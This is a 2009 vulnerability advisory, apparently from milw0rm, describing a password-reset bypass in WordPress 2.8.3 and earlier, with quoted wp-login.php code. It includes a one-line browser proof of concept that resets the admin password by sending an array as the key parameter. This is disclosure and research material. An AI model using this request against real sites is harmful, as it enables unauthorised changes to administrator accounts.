@@ -1,0 +1,132 @@
+=============================================
+- Release date: August 10th, 2009
+- Discovered by: Laurent Gaffié
+- Severity: Medium
+=============================================
+
+I. VULNERABILITY
+-------------------------
+WordPress <= 2.8.3 Remote admin reset password
+
+II. BACKGROUND
+-------------------------
+WordPress is a state-of-the-art publishing platform with a focus on
+aesthetics, web standards, and usability. WordPress is both free and
+priceless at the same time. More simply, WordPress is what you use when
+you want to work with your blogging software, not fight it.
+
+III. DESCRIPTION
+-------------------------
+The way Wordpress handle a password reset looks like this:
+You submit your email adress or username via this form /wp-login.php?action=lostpassword ;
+Wordpress send you a reset confirmation like that via email:
+
+"
+Someone has asked to reset the password for the following site and username.
+http://DOMAIN_NAME.TLD/wordpress
+Username: admin
+To reset your password visit the following address, otherwise just
+ignore this email and nothing will happen
+
+http://DOMAIN_NAME.TLD/wordpress/wp-login.php?action=rp&key=o7naCKN3OoeU2KJMMsag
+"
+
+You click on the link, and then Wordpress reset your admin password, and
+sends you over another email with your new credentials.
+
+Let's see how it works:
+
+
+wp-login.php:
+...[snip]....
+line 186:
+function reset_password($key) {
+    global $wpdb;
+
+    $key = preg_replace('/[^a-z0-9]/i', '', $key);
+
+    if ( empty( $key ) )
+        return new WP_Error('invalid_key', __('Invalid key'));
+
+    $user = $wpdb->get_row($wpdb->prepare("SELECT * FROM $wpdb->users WHERE user_activation_key = %s", $key));
+    if ( empty( $user ) )
+        return new WP_Error('invalid_key', __('Invalid key'));
+...[snip]....
+line 276:
+$action = isset($_REQUEST['action']) ? $_REQUEST['action'] : 'login';
+$errors = new WP_Error();
+
+if ( isset($_GET['key']) )
+    $action = 'resetpass';
+
+// validate action so as to default to the login screen
+if ( !in_array($action, array('logout', 'lostpassword', 'retrievepassword', 'resetpass', 'rp', 'register', 'login')) && false === has_filter('login_form_' . $action) )
+    $action = 'login';
+...[snip]....
+
+line 370:
+
+break;
+
+case 'resetpass' :
+case 'rp' :
+    $errors = reset_password($_GET['key']);
+
+    if ( ! is_wp_error($errors) ) {
+        wp_redirect('wp-login.php?checkemail=newpass');
+        exit();
+    }
+
+    wp_redirect('wp-login.php?action=lostpassword&error=invalidkey');
+    exit();
+
+break;
+...[snip ]...
+
+You can abuse the password reset function, and bypass the first step and
+then reset the admin password by submiting an array to the $key
+variable.
+ 
+
+IV. PROOF OF CONCEPT
+-------------------------
+A web browser is sufficiant to reproduce this Proof of concept:
+http://DOMAIN_NAME.TLD/wp-login.php?action=rp&key[]=
+The password will be reset without any confirmation.
+ 
+V. BUSINESS IMPACT
+-------------------------
+An attacker could exploit this vulnerability to compromise the admin
+account of any wordpress/wordpress-mu <= 2.8.3
+
+VI. SYSTEMS AFFECTED
+-------------------------
+All
+
+VII. SOLUTION
+-------------------------
+No patch aviable for the moment.
+ 
+VIII. REFERENCES
+-------------------------
+http://www.wordpress.org
+
+IX. CREDITS
+-------------------------
+This vulnerability has been discovered by Laurent Gaffié Laurent.gaffie{remove-this}(at)gmail.com
+I'd like to shoot some greetz to securityreason.com for them great
+research on PHP, as for this under-estimated vulnerability discovered by
+Maksymilian Arciemowicz : http://securityreason.com/achievement_securityalert/38
+
+X. REVISION HISTORY
+-------------------------
+August 10th, 2009: Initial release
+
+XI. LEGAL NOTICES
+-------------------------
+The information contained within this advisory is supplied "as-is"
+with no warranties or guarantees of fitness of use or otherwise.
+I accept no responsibility for any damage caused by the use or
+misuse of this information.
+
+# milw0rm.com [2009-08-11]
